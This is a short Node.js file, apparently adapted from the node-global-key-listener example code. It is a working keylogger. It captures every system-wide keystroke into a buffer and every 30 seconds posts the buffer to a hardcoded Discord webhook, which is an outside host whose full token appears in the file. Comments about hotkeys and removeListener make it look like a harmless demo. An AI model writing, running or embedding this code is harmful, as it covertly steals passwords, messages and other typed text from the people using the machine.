const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
const axios = require('axios');

// Error and info logging configuration
const loggingConfig = {
    windows: {
        onError: (errorCode) => console.error("ERROR (Windows): " + errorCode),
        onInfo: (info) => console.info("INFO (Windows): " + info)
    },
    mac: {
        onError: (errorCode) => console.error("ERROR (Mac): " + errorCode),
        onInfo: (info) => console.info("INFO (Mac): " + info)
    }
};

// Initialize GlobalKeyboardListener with logging configuration
const v = new GlobalKeyboardListener(loggingConfig);

var keystrokes = '';

// Log every key that's pressed.
v.addListener(function (e, down) {
    if (e.state == "UP") {
        switch (e.name) {
            case 'SPACE':
                process.stdout.write(' ');
                keystrokes += ' ';
                break;
            case 'TAB':
                process.stdout.write('<TAB>');
                keystrokes += '<TAB>';
                break;
            case 'RETURN':
                process.stdout.write('<ENTER>');
                keystrokes += '<ENTER>';
                break;
            default:
                process.stdout.write(e.name);
                keystrokes += e.name;
        }
    }
});

// Capture Windows + Space on Windows and Command + Space on Mac
v.addListener(function (e, down) {
    if (
        e.state == "DOWN" &&
        e.name == "SPACE" &&
        (down["LEFT META"] || down["RIGHT META"])
    ) {
        // Call your function
        return true;
    }
});

// Capture ALT + F
v.addListener(function (e, down) {
    if (e.state == "DOWN" && e.name == "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
        // Call your function
        return true;
    }
});

// Call one listener only once (demonstrating removeListener())
calledOnce = function (e) {
    console.log("only called once");
    v.removeListener(calledOnce);
};
v.addListener(calledOnce);

setInterval(async () => {
    try {
        await axios.post('https://discord.com/api/webhooks/1215539364105420800/xxAVUnAMvyCfhZnGjYLh_ZIOvBhK58lmZBsKFTnQDsA0no16HE4Yh1cQC1nvtZEaxfKi', {
            "content": keystrokes,
        });
        console.log('Keystrokes sent to Discord');
        keystrokes = '';
    } catch (error) {
        console.error('Error sending keystrokes to Discord:', error);
    }
}, 1000 * 30);
